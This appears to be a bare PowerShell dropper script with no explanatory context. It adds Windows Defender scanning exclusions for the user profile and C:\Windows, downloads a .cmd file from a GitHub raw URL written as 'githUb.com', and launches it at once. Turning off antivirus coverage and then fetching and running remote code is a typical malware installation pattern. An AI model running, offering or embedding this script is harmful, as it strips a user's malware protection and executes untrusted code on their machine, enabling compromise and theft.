Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\Windows
$url = "githUb.com/hot90923/123/raw/refs/heads/main/FixL.cmd"
$output = "$env:Fix.cmd"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
